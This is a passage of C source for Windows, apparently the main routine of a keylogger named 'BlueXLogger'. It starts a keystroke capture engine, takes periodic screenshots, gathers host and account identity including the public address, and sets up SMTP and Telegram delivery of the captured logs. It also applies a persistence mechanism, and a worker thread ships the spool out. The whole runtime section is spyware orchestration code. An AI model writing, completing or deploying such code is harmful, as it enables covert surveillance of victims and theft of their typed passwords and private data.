    if (p->cfg.single_instance) {
        p->mutex = CreateMutexW(NULL, TRUE, L"Global\\BlueXLogger_Singleton");
        if (p->mutex && GetLastError() == ERROR_ALREADY_EXISTS) {
            CloseHandle(p->mutex);
            return 0;   /* already running */
        }
    }

    if (!resolve_storage(p)) {
        if (!selftest) return 0;
        StringCchCopyW(p->storage, BXL_COUNT_OF(p->storage), L".");
    }
    bxl_dir_create(p->storage);

    bxl_log_set_dir(p->storage);
    if (p->cfg.debug_log) bxl_log_enable_file(1);

    bxl_logf("%s %s starting (%s)", BXL_PRODUCT_NAME, BXL_VERSION_STR,
             BXL_WATERMARK);
    bxl_logf("config: %s", p->configured ? "loaded" : "defaults");

    /* ---- self-test ------------------------------------------------------ */
    if (selftest) {
        int rc;
        if (!bxl_path_join(report, BXL_COUNT_OF(report), p->storage,
                           L"selftest.txt")) {
            StringCchCopyW(report, BXL_COUNT_OF(report), L"selftest.txt");
        }
        rc = run_selftest(p, report);
        if (p->mutex) { ReleaseMutex(p->mutex); CloseHandle(p->mutex); }
        return rc;
    }

    /* ---- runtime -------------------------------------------------------- */
    if (!bxl_net_startup()) {
        bxl_logf("winsock startup failed");
        if (p->mutex) { ReleaseMutex(p->mutex); CloseHandle(p->mutex); }
        return 1;
    }

    bxl_fmt_default_options(&p->fmtopt);
    bxl_fmt_init(&p->modstate, &p->fmtopt);
    bxl_screenshot_options_from(&p->cfg, &p->shotopt);
    bxl_smtp_config_from(&p->cfg, &p->smtp);
    bxl_telegram_config_from(&p->cfg, &p->tg);
    /* Hostname, account, OS and the local address are cheap and need no
     * network; the public address is resolved lazily on the worker thread so
     * a slow lookup can never delay start-up. */
    bxl_identity_init(&p->id);
    bxl_context_cache_init(&p->ctxcache);

    if (!bxl_logbuf_init(&p->lb, p->storage)) {
        bxl_logf("cannot initialise the spool - aborting");
        if (p->mutex) { ReleaseMutex(p->mutex); CloseHandle(p->mutex); }
        return 1;
    }

    bxl_sched_init(&p->sched, &p->cfg, bxl_now_ms(), bxl_unix_time(),
                   (bxl_u32)bxl_unix_time() ^ (bxl_u32)GetCurrentProcessId());

    recover_pending(p);

    p->stop_evt = CreateEventW(NULL, TRUE, FALSE, NULL);

    if (!bxl_capture_start(&p->cap, p->cfg.capture_raw_input)) {
        bxl_logf("capture engine failed to start");
    }

    /* ---- persistence ---------------------------------------------------- */
    if (p->cfg.persistence != BXL_PERSIST_OFF)
        bxl_persist_apply(p->cfg.persistence, p->exe_path);

    /* ---- worker --------------------------------------------------------- */
    p->worker = CreateThread(NULL, 0, worker_proc, p, 0, NULL);
    if (!p->worker) {
        bxl_logf("worker thread creation failed");
        bxl_capture_stop(&p->cap);
        bxl_logbuf_close(&p->lb);
        if (p->mutex) { ReleaseMutex(p->mutex); CloseHandle(p->mutex); }
        return 1;
    }

    /* ---- hotkeys -------------------------------------------------------- */
    if (p->cfg.hotkey_enabled) {
        if (!RegisterHotKey(NULL, BXL_HOTKEY_ID,
                            (UINT)p->cfg.hotkey_mods | MOD_NOREPEAT,
                            (UINT)p->cfg.hotkey_vk)) {
            bxl_logf("hotkey registration failed (%lu)", GetLastError());
        } else {
            p->pause_hotkey_registered = 1;
        }
    }
    if (p->cfg.quit_hotkey_enabled) {
        if (!RegisterHotKey(NULL, BXL_QUIT_HOTKEY_ID,
                            (UINT)p->cfg.quit_hotkey_mods | MOD_NOREPEAT,
                            (UINT)p->cfg.quit_hotkey_vk)) {
            bxl_logf("quit hotkey registration failed (%lu)", GetLastError());
        } else {
            p->quit_hotkey_registered = 1;
            bxl_logf("quit hotkey armed - pressing it flushes the spool, makes "
                     "a final delivery attempt and exits");
        }
    }

    bxl_logf("running - log every %u min / %u keys, screenshots every %u min",
             p->cfg.log_interval_min, p->cfg.log_keystroke_threshold,
             p->cfg.shot_interval_min);

    /* ---- message pump --------------------------------------------------- */
    for (;;) {
        BOOL got = GetMessageW(&msg, NULL, 0, 0);

        if (got == 0) break;            /* WM_QUIT: a clean stop was requested */
        if (got == -1) {                /* the queue itself failed, not a msg */
            bxl_logf("message pump failed (%lu) - shutting down", GetLastError());
            break;
        }

        if (msg.message == WM_HOTKEY) {
            if (msg.wParam == BXL_HOTKEY_ID) {
                p->paused = p->paused ? 0 : 1;
                bxl_logf("capture %s by hotkey",
                         p->paused ? "PAUSED" : "RESUMED");
                continue;
            }
            if (msg.wParam == BXL_QUIT_HOTKEY_ID) {
                /* Fall through to the shutdown block below, which drains the
                 * capture queue, seals the spool and makes a final delivery
                 * attempt. Ending the process from Task Manager instead would
                 * skip all of that. */
                bxl_logf("quit hotkey - shutting down cleanly");
                PostQuitMessage(0);
                continue;
            }
        }

        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    /* ---- shutdown ------------------------------------------------------- */
    bxl_logf("shutdown requested");
    p->shutdown = 1;
    if (p->stop_evt) SetEvent(p->stop_evt);
    if (p->worker) {
        WaitForSingleObject(p->worker, 30000);
        CloseHandle(p->worker);
    }

    if (p->pause_hotkey_registered) UnregisterHotKey(NULL, BXL_HOTKEY_ID);
    if (p->quit_hotkey_registered) UnregisterHotKey(NULL, BXL_QUIT_HOTKEY_ID);
    bxl_capture_stop(&p->cap);
    bxl_logbuf_close(&p->lb);
    if (p->stop_evt) CloseHandle(p->stop_evt);
    bxl_net_cleanup();

    if (p->mutex) { ReleaseMutex(p->mutex); CloseHandle(p->mutex); }
    return 0;
}
